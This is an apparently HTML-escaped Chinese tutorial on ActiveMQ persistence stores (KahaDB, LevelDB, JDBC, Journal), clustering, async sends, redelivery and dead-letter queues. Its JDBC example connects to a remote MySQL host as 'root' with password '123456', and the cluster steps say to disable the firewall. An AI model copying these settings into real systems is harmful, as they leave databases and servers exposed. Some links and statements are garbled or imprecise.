&lt;p&gt;新兴的技术，现在有些不确定。 官方文档：&lt;a href=&quot;http://activemq.apache.org/leveldb-store%E3%80%82%E8%BF%99%E7%A7%8D%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%98%AF%E4%BB%8EActiveMQ5.8%E4%B9%8B%E5%90%8E%E5%BC%95%E8%BF%9B%E7%9A%84%EF%BC%8C%E5%AE%83%E5%92%8CKahaDB%E9%9D%9E%E5%B8%B8%E7%9B%B8%E4%BC%BC%EF%BC%8C%E4%B9%9F%E6%98%AF%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E7%9A%84%E6%9C%AC%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8%E5%BD%A2%E5%BC%8F%EF%BC%8C%E4%BD%86%E6%98%AF%E5%AE%83%E6%8F%90%E4%BE%9B%E6%AF%94KahaDB%E6%9B%B4%E5%BF%AB%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E3%80%82%E4%BD%86%E5%AE%83%E4%B8%8D%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%9A%E4%B9%89B-Tree%E5%AE%9E%E7%8E%B0%E6%9D%A5%E7%B4%A2%E5%BC%95%E7%8B%AC%E5%86%99%E6%97%A5%E5%BF%97%EF%BC%8C%E8%80%8C%E6%98%AF%E4%BD%BF%E7%94%A8%E5%9F%BA%E4%BA%8ELevelDB%E7%9A%84%E7%B4%A2%E5%BC%95%EF%BC%8C%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E5%A6%82%E4%B8%8B%EF%BC%9A&quot; target=&quot;_blank&quot;&gt;http://activemq.apache.org/leveldb-store。这种文件系统是从ActiveMQ5.8之后引进的，它和KahaDB非常相似，也是基于文件的本地数据库存储形式，但是它提供比KahaDB更快的持久性。但它不使用自定义B-Tree实现来索引独写日志，而是使用基于LevelDB的索引，默认配置如下：&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;persistenceAdapter&amp;gt;  
        &amp;lt;levelDB directory=&quot;activemq-data&quot;/&amp;gt;
&amp;lt;/persistenceAdapter&amp;gt; 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;JDBC消息存储&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面我们再详细介绍&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JDBC Message Store with ActiveMQ Journal&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面我们再详细介绍&lt;/p&gt;
&lt;h5 id=&quot;84-kahadb消息存储&quot;&gt;8.4 KahaDB消息存储&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;理解&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;KahaDB是目前默认的存储方式，可用于任何场景，提高了性能和恢复能力。&lt;span&gt;消息存储使用一个 &lt;strong&gt;事务日志&lt;/strong&gt; 和仅仅用一个 &lt;strong&gt;索引文件&lt;/strong&gt; 来存储它所有的地址。&lt;/span&gt;KahaDB是一个专门针对消息持久化的解决方案，它对典型的消息使用模型进行了优化。数据被追加到data logs中。当不再需要log文件中的数据的时候，log文件会被丢弃。&lt;/p&gt;
&lt;p&gt;官网文档：&lt;a href=&quot;http://activemq.aache.org/kahadb%EF%BC%8C%E5%AE%98%E7%BD%91%E4%B8%8A%E8%BF%98%E6%9C%89%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E3%80%82&quot; target=&quot;_blank&quot;&gt;http://activemq.aache.org/kahadb，官网上还有一些其他配置参数。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;activemq.xml配置文件&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;persistenceAdapter&amp;gt;
    &amp;lt;kahaDB directory=&quot;${activemq.data}/kahadb&quot;/&amp;gt;
&amp;lt;/persistenceAdapter&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;KahaDB存储原理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;KahaDB在消息保存的目录中有4类文件和一个lock，跟ActiveMQ的其他几种文件存储引擎相比，这就非常简洁了。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118000120.png&quot; alt=&quot;image-20210118000120620&quot;/&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;db-number.log&lt;/code&gt; KahaDB存储消息到预定大小的数据纪录文件中，文件名为db-number.log。当数据文件已满时，一个新的文件会随之创建，number数值也会随之递增，它随着消息数量的增多，如每32M一个文件，文件名按照数字进行编号，如db-1.log，db-2.log······。当不再有引用到数据文件中的任何消息时，文件会被删除或者归档。&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118001312.png&quot; alt=&quot;image-20210118001312244&quot;/&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;db.data&lt;/code&gt; 该文件包含了持久化的BTree索引，索引了消息数据记录中的消息，它是消息的索引文件，本质上是B-Tree（B树），使用B-Tree作为索引指向db-number。log里面存储消息。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;db.free&lt;/code&gt; 记录当前db.data文件里面哪些页面是空闲的，文件具体内容是所有空闲页的ID&lt;/li&gt;
&lt;li&gt;&lt;code&gt;db.redo&lt;/code&gt; 用来进行消息恢复，如果KahaDB消息存储再强制退出后启动，用于恢复BTree索引。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;lock&lt;/code&gt; 文件锁，表示当前kahadb独写权限的broker。&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;84-jdbc消息存储&quot;&gt;8.4 JDBC消息存储&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;原理图&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118002603.png&quot; alt=&quot;image-20210118002603363&quot;/&gt;&lt;p&gt;&lt;strong&gt;配置&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;添加mysql数据库的驱动包到ActiveMQ的lib文件夹下&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118003932.png&quot; alt=&quot;image-20210118003932035&quot;/&gt;&lt;p&gt;在activemq.xml配置文件指定JDBC消息存储&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;!--  
&amp;lt;persistenceAdapter&amp;gt;
     &amp;lt;kahaDB directory=&quot;${activemq.data}/kahadb&quot;/&amp;gt;
&amp;lt;/persistenceAdapter&amp;gt;
--&amp;gt;
&amp;lt;persistenceAdapter&amp;gt;  
    &amp;lt;!-- dataSource指定将要引用的持久化数据库的bean名称
                createTablesOnStartup指定是否在启动的时候创建数据表，默认为true
                注意：一般是第一次启动时设置为true，之后改为false  --&amp;gt;
    &amp;lt;jdbcPersistenceAdapter dataSource=&quot;#mysql-ds&quot; createTablesOnStartup=&quot;true&quot;/&amp;gt; 
&amp;lt;/persistenceAdapter&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在activemq.xml配置文件的标签和标签之间插入数据库连接池配置&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;① 我们需要准备一个mysql数据库，并创建一个名为activemq的数据库&lt;/p&gt;
&lt;p&gt;② 默认是的dbcp数据库连接池，如果要换成其他数据库连接池，需要将该连接池jar包，也放到lib目录下。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;...
&amp;lt;/broker&amp;gt;

&amp;lt;bean id=&quot;mysql-ds&quot; class=&quot;org.apache.commons.dbcp2.BasicDataSource&quot; destroy-method=&quot;close&quot;&amp;gt;     
    &amp;lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&amp;gt;     
    &amp;lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://mpolaris.top:3306/activemq?relaxAutoCommit=true&quot;/&amp;gt;     
    &amp;lt;property name=&quot;username&quot; value=&quot;root&quot;/&amp;gt;     
    &amp;lt;property name=&quot;password&quot; value=&quot;123456&quot;/&amp;gt;
    &amp;lt;property name=&quot;maxTotal&quot; value=&quot;200&quot; /&amp;gt;
    &amp;lt;property name=&quot;poolPreparedStatements&quot; value=&quot;true&quot;/&amp;gt;   
&amp;lt;/bean&amp;gt; 


&amp;lt;import resource=&quot;jetty.xml&quot;/&amp;gt;
...
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;重启activemq会自动生成如下3张表。如果没有自动生成需要我们手动执行SQL。我个人建议要自动生成，我在操作过程中查看日志文件发现了不少问题，最终解决了这些问题后是能够自动生成的。如果不能自动生成说明你的操作有问题。表字段说明如下&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;ACTIVEMQ_MSGS 消息数据表&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118013014.png&quot; alt=&quot;image-20210118013013862&quot;/&gt;&lt;ul&gt;&lt;li&gt;ACTIVEMQ_ACKS数据表&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118012701.png&quot; alt=&quot;image-20210118012701231&quot;/&gt;&lt;ul&gt;&lt;li&gt;ACTIVEMQ_LOCK数据表：表ACTIVEMQ_LOCK在集群环境下才有用，只有一个Broker可以获取消息，称为Master Broker，其他的只能作为备份等待Master Broker不可用，才可能成为下一个Master Broker。这个表用于记录哪个Broker是当前的Master Broker 。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Queue验证和数据表变化&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在点对点类型中，当DeliveryMode设置为NON_PERSISTENCE时，消息被保存在内存中。当DeliveryMode设置为PERSISTENCE时，消息保存在broker的相应的文件或者数据库中。而且点对点类型中消息一旦被Consumer消费，就从数据中删除，消费前的消息会被存放到数据库 上面的消息被消费后被MQ自动删除。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Queue非持久化模式：不会将消息持久化到数据库&lt;/li&gt;
&lt;li&gt;Queue持久化模式：会将消息持久化到数据库，但是消息被消费者消费后会自动删除持久化数据。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;我们使用queue持久化模式发布3条消息后，发现ACTIVEMQ_MSGS数据表多了3条数据。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118224439.png&quot; alt=&quot;image-20210118224439794&quot;/&gt;&lt;p&gt;启动消费者消费了所有的消息后，发现数据表的数据消失了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Topic验证和说明&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;设置了持久订阅数据库里面会保存订阅者的信息&lt;/p&gt;
&lt;p&gt;ACTIVEMQ_ACKS表中的LAST_ACKED_ID记录了CLIENT_ID最后签收的一条消息，而LAST_ACKED_ID和ACTIVEMQ_MSGS的ID字段是外键关联关系，这样就可以实现Topic的消息保存到ACTIVEMQ_MSGS表内的同时还能根据ACTIVEMQ_ACKS表中的持久订阅者查到该订阅者上次收到的最后一条消息是什么。值得注意的是Topic内的消息是不会被删除的，而Queue的消息在被删除后会在数据库中被删除，如果需要保存Queue，应该使用其他方案解决。&lt;/p&gt;
&lt;p&gt;我们启动主题持久化，生产者发布3个数据，ACTIVEMQ_MSGS数据表新增3条数据，消费者消费所有的数据后，ACTIVEMQ_MSGS数据表的数据并没有消失。持久化topic的消息不管是否被消费，是否有消费者，产生的数据永远都存在，且只存储一条。这个是要注意的，持久化的topic大量数据后可能导致性能下降。这里就像公总号一样，消费者消费完后，消息还会保留。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118224334.png&quot; alt=&quot;image-20210118224334233&quot;/&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118223758.png&quot; alt=&quot;image-20210118223750666&quot;/&gt;&lt;p&gt;&lt;strong&gt;总结&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果是Queue，在没有消费者消费的情况下会将消息保存到activemq_msgs表中，只要有任意一个消费者消费了，就会删除消费过的消息。&lt;/p&gt;
&lt;p&gt;如果是Topic，一般是先启动消费订阅者然后再生产的情况下会将持久订阅者永久保存到qctivemq_acks，而消息则永久保存在activemq_msgs，在acks表中的订阅者有一个last_ack_id对应了activemq_msgs中的id字段，这样就知道订阅者最后收到的消息是哪一条。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;常见坑&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在配置关系型数据库作为ActiveMQ的持久化存储方案时，有许多坑。&lt;/p&gt;
&lt;ul readability=&quot;1.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;数据库jar包：注意对应版本的数据库jar或者你自己使用的非自带的数据库连接池jar包&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;createTablesOnStartup属性：该属性默认为true，每次启动activemq都会自动创建表，在第一次启动后应改为false避免不必要的损失。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;下划线：报错&quot;java.lang.IllegalStateException: LifecycleProcessor not initialized&quot;。确认计算机主机名名称没有下划线&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;85-jdbc-message-store-with-activemq-journal&quot;&gt;8.5 JDBC Message Store with ActiveMQ Journal&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;理解&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这种方式克服了JDBC Store的不足，JDBC每次消息过来都需要去写库读库。ActiveMQ Journal，使用高速缓存写入技术大大提高了性能。当消费者的速度能够及时跟上生产者消息的生产速度时，journal文件能够大大减少需要写入到DB中的消息。&lt;/p&gt;
&lt;p&gt;举个例子：生产者生产了1000条消息，这1000条消息会保存到journal文件，如果消费者的消费速度很快的情况下，在journal文件还没有同步到DB之前，消费者已经消费了90%的以上消息，那么这个时候只需要同步剩余的10%的消息到DB。如果消费者的速度很慢，这个时候journal文件可以使消息以批量方式写到DB。&lt;/p&gt;
&lt;p&gt;为了高性能，这种方式使用日志文件存储+数据库存储。&lt;span&gt;先将消息持久到日志文件，等待一段时间再将未消费的消息持久到数据库。&lt;/span&gt;该方式要比JDBC性能要高&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;配置&lt;/strong&gt;（基于JDBC配置稍作修改）&lt;/p&gt;
&lt;p&gt;activemq.xml修改&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# 修改配置前
&amp;lt;persistenceAdapter&amp;gt;         
     &amp;lt;jdbcPersistenceAdapter dataSource=&quot;#mysql-ds&quot; /&amp;gt; 
&amp;lt;/persistenceAdapter&amp;gt;

# 修改配置后（注释掉之前的jdbc配置使用下面的）
&amp;lt;persistenceFactory&amp;gt;                            
    &amp;lt;journalPersistenceAdapterFactory                                                               journalLogFiles=&quot;5&quot;
          journalLogFileSize=&quot;32768&quot;
          useJournal=&quot;true&quot;
          useQuickJournal=&quot;true&quot;
          dataSource=&quot;#mysql-ds&quot;
          dataDirectory=&quot;../activemq-data&quot; /&amp;gt; 
&amp;lt;/persistenceFactory&amp;gt; 
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;86-总结&quot;&gt;8.6 总结&lt;/h5&gt;
&lt;ul readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;Jdbc效率低，KahaDB效率高，Jdbc+Journal效率较高。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;持久化消息主要指的是：MQ所在服务器宕机了消息不会丢试的机制。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;持久化机制演变的过程：从最初的AMQ Message Store方案到ActiveMQ V4版本退出的High Performance Journal（高性能事务支持）附件，并且同步推出了关于关系型数据库的存储方案。ActiveMQ5.3版本又推出了对KahaDB的支持（5.4版本后被作为默认的持久化方案），后来ActiveMQ 5.8版本开始支持LevelDB，到现在5.9提供了标准的Zookeeper+LevelDB集群化方案。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;ActiveMQ消息持久化机制有：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;持久化机制&lt;/th&gt;
&lt;th&gt;特点&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;2.5&quot;&gt;&lt;tr&gt;&lt;td&gt;AMQ&lt;/td&gt;
&lt;td&gt;基于日志文件&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;KahaDB&lt;/td&gt;
&lt;td&gt;基于日志文件，从ActiveMQ5.4开始默认使用&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;JDBC&lt;/td&gt;
&lt;td&gt;基于第三方数据库&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;Replicated LevelDB Store&lt;/td&gt;
&lt;td&gt;从5.9开始提供了LevelDB和Zookeeper的数据复制方法，用于Master-slave方式的首选数据复制方案。&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h4 id=&quot;9-activemq多节点集群&quot;&gt;9. ActiveMQ多节点集群&lt;/h4&gt;
&lt;h5 id=&quot;91-理解&quot;&gt;9.1 理解&lt;/h5&gt;
&lt;p&gt;基于zookeeper和LevelDB搭建ActiveMQ集群。集群仅提供主备方式的高可用集群功能，避免单点故障。&lt;/p&gt;
&lt;h5 id=&quot;92-三种集群方式&quot;&gt;9.2 三种集群方式&lt;/h5&gt;
&lt;h5 id=&quot;93-zk--replicated-leveldb-store-案例&quot;&gt;9.3 ZK + Replicated LevelDB Store 案例&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;Replicated LevelDB Store&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;0.95238095238095&quot;&gt;
&lt;p&gt;是什么：&lt;a href=&quot;http://activemq.apache.org/replicated-leveldb-store&quot; target=&quot;_blank&quot;&gt;http://activemq.apache.org/replicated-leveldb-store&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用Zookeeper集群注册所有的ActiveMQ Broker但只有其中一个Broker可以提供服务，它将被视为Master，其他的Broker处于待机状态被视为Slave。如果Master因故障而不能提供服务，Zookeeper会从Slave中选举出一个Broker充当Master。Slave连接Master并同步他们的存储状态，Slave不接受客户端连接。所有的存储操作都将被复制到连接至Maste的Slaves。如果Master宕机得到了最新更新的Slave会变成Master。故障节点在恢复后会重新加入到集群中并连接Master进入Slave模式。所有需要同步的消息操作都将等待存储状态被复制到其他法定节点的操作完成才能完成。所以，如给你配置了replicas=3，name法定大小是（3/2）+1 = 2。Master将会存储更新然后等待（2-1）=1个Slave存储和更新完成，才汇报success，至于为什么是2-1，阳哥的zookeeper讲解过自行复习。有一个ode要作为观察者存在。当一个新的Master被选中，你需要至少保障一个法定mode在线以能够找到拥有最新状态的ode，这个ode才可以成为新的Master。因此，推荐运行至少3个replica nodes以防止一个node失败后服务中断。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;部署规划和步骤&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;环境和版本&lt;/li&gt;
&lt;li&gt;关闭防火墙并保证各个服务器能够ping通&lt;/li&gt;
&lt;li&gt;具备zk集群并可以成功启动&lt;/li&gt;
&lt;li&gt;集群部署规划列表&lt;/li&gt;
&lt;li&gt;创建3台集群目录（就是一台电脑复制三份ActiveMQ）&lt;/li&gt;
&lt;li&gt;修改管理控制台端口（就是ActiveMQ后台管理页面的访问端口）&lt;/li&gt;
&lt;li&gt;hostname名字映射（如果不映射只需要吧mq配置文件的hostname改成当前主机ip）&lt;/li&gt;
&lt;li&gt;ActiveMQ集群配置
&lt;ul&gt;&lt;li&gt;配置文件里面的BrokerName要全部一致&lt;/li&gt;
&lt;li&gt;持久化配置(必须)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;修改各个节点的消息端口（真实的三台机器不用管）&lt;/li&gt;
&lt;li&gt;按顺序启动3个ActiveMQ节点,到这步前提是zk集群已经成功启动运行（先启动Zk 在启动ActiveMQ）&lt;/li&gt;
&lt;li&gt;zk集群节点状态说明
&lt;ul&gt;&lt;li&gt;3台Zk连接任意一台验证三台ActiveMQ是否注册上了Zookeeper&lt;/li&gt;
&lt;li&gt;查看Master&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;集群可用性测试&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;10-activemq高级特性&quot;&gt;10 ActiveMQ高级特性&lt;/h4&gt;
&lt;h5 id=&quot;101-引入消息中间件后如何保证其高可用&quot;&gt;10.1 引入消息中间件后如何保证其高可用&lt;/h5&gt;
&lt;p&gt;zookeeper+Replicated LevelDB&lt;/p&gt;
&lt;h5 id=&quot;102-异步投递async-sends&quot;&gt;10.2 异步投递Async Sends&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;异步投递&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;a href=&quot;http://activemq.apache.org/async-sends&quot; target=&quot;_blank&quot;&gt;http://activemq.apache.org/async-sends&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对于一个Slow Consumer，使用同步发送消息可能出现Producer堵塞的情况，慢消费者适合使用异步发送。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;是什么&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ActiveMQ支持同步，异步两种发送的模式将消息发送到broker，模式的选择对发送延时有巨大的影响。producer能达到怎么样的产出率（产出率=发送数据总量/时间）主要受发送延时的影响，使用异步发送可以显著提高发送的性能。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;ActiveMQ默认使用异步发送的模式：&lt;/span&gt;除非明确指定使用同步发送的方式或者在未使用事务的前提下发送持久化的消息，这两种情况都是同步发送的。&lt;/p&gt;
&lt;p&gt;如果你 &lt;span&gt;没有使用事务且发送的是持久化的消息，&lt;/span&gt;每一次发送都是同步发送的且会阻塞producer知道broker返回一个确认，表示消息已经被安全的持久化到磁盘。确认机制提供了消息安全的保障，但同时会阻塞客户端带来了很大的延时。很多高性能的应用，&lt;span&gt;允许在失败的情况下有少量的数据丢失。&lt;/span&gt;如果你的应用满足这个特点，你可以使用异步发送来提高生产率，即使发送的是持久化的消息。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;异步发送：&lt;/span&gt;它可以最大化producer端的发送效率。&lt;span&gt;我们通常在发送消息量比较密集的情况下使用异步发送，&lt;/span&gt;它可以很大的提升Producer性能，不过这也带来了额外的问题：就是需要消耗更多的Client端内存同时也会导致broker端性能消耗增加；此外它不能有效的确保消息的发送成功。在userAsyncSend=true的情况下客户端需要容忍消息丢失的可能。&lt;/p&gt;
&lt;blockquote readability=&quot;15&quot;&gt;
&lt;p&gt;自我理解：此处的异步是指生产者和broker之间发送消息的异步。不是指生产者和消费者之间异步。&lt;/p&gt;
&lt;p&gt;说明：对于一个Slow Consumer,使用同步发送消息可能出成Producer堵塞等情况，慢消费者适合使用异步发送。(这句话我认为有误)&lt;/p&gt;
&lt;p&gt;总结：① 异步发送可以让生产者发的更快。② 如果异步投递不需要保证消息是否发送成功，发送者的效率会有所提高。如果异步投递还需要保证消息是否成功发送，并采用了回调的方式，发送者的效率提高不多，这种就有些鸡肋。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;参考官网代码实现&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;异步消息如何确定发送成功?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;异步发送丢失消息的场景是：生产者设置&lt;code&gt;userAsyncSend=true&lt;/code&gt;，使用&lt;code&gt;producer.send(msg)&lt;/code&gt;持续发送消息。如果消息不阻塞，生产者会认为所有&lt;code&gt;send&lt;/code&gt;的消息均被成功发送至&lt;code&gt;MQ&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;如果MQ突然宕机，此时生产者端内存中尚未被发送至MQ的消息&lt;span&gt;都会丢失&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;所以正确的异步发送方法是需要接收回调的。&lt;/p&gt;
&lt;p&gt;同步发送和异步发送的区别就在此，同步发送等&lt;code&gt;send&lt;/code&gt;不阻塞了就表示一定发送成功了，异步发送需要客户端回执并由客户端再判断一次是否发送成功。&lt;/p&gt;
&lt;h5 id=&quot;103-延迟投递和定时投递&quot;&gt;10.3 延迟投递和定时投递&lt;/h5&gt;
&lt;blockquote readability=&quot;0.91463414634146&quot;&gt;
&lt;p&gt;官网说明：&lt;a href=&quot;http://activemq.apache.org/delay-and-schedule-message-delivery.html&quot; target=&quot;_blank&quot;&gt;http://activemq.apache.org/delay-and-schedule-message-delivery.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;四大属性&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118234204.png&quot; alt=&quot;image-20210118234204346&quot;/&gt;&lt;p&gt;&lt;strong&gt;案例&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;要在activemq.xml中配置schedulerSupport属性为true&lt;/p&gt;
&lt;p&gt;Java代码里面封装的辅助消息类型：ScheduledMessage&lt;/p&gt;
&lt;h5 id=&quot;104-分发策略&quot;&gt;10.4 分发策略&lt;/h5&gt;
&lt;h5 id=&quot;105-activemq消息重试机制&quot;&gt;10.5 ActiveMQ消息重试机制&lt;/h5&gt;
&lt;blockquote readability=&quot;1.271186440678&quot;&gt;
&lt;p&gt;官网说明：&lt;a href=&quot;http://activemq.apache.org/redelivery-policy&quot; target=&quot;_blank&quot;&gt;http://activemq.apache.org/redelivery-policy&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;是什么&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;消费者收到消息，之后出现异常了，没有告诉broker确认收到该消息，broker会尝试再将该消息发送给消费者。尝试n次，如果消费者还是没有确认收到该消息，那么该消息将被放到死信队列重，之后broker不会再将该消息发送给消费者。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;具体哪些情况会引发消息重发&lt;/strong&gt;&lt;/p&gt;
&lt;ul readability=&quot;0&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;Client用了transactions且再session中调用了rollback&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;Client用了transactions且再调用commit之前关闭或者没有commit&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;Client再CLIENT_ACKNOWLEDGE的传递模式下，session中调用了recover&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;请说说消息重发时间间隔和重发次数&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;间隔：1&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;次数：6&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;每秒发6次&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;有毒消息Poison ACK&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一个消息被redelivedred超过默认的最大重发次数（默认6次）时，消费的回个MQ发一个“poison ack”表示这个消息有毒，告诉broker不要再发了。这个时候broker会把这个消息放到DLQ（私信队列）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;属性说明&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118234607.png&quot; alt=&quot;image-20210118234607271&quot;/&gt;&lt;h5 id=&quot;106-死信队列&quot;&gt;10.6 死信队列&lt;/h5&gt;
&lt;blockquote readability=&quot;1.271186440678&quot;&gt;
&lt;p&gt;官方文档：&lt;a href=&quot;http://activemq.apache.org/redelivery-policy&quot; target=&quot;_blank&quot;&gt;http://activemq.apache.org/redelivery-policy&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;是什么&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;异常消息规避处理的集合，主要处理失败的消息。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118234737.png&quot; alt=&quot;image-20210118234737121&quot;/&gt;&lt;p&gt;&lt;strong&gt;使用：处理失败的消息&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;一般生产环境中在使用MQ时设计两个队列：一个核心业务队列，一个死信队列&lt;/li&gt;
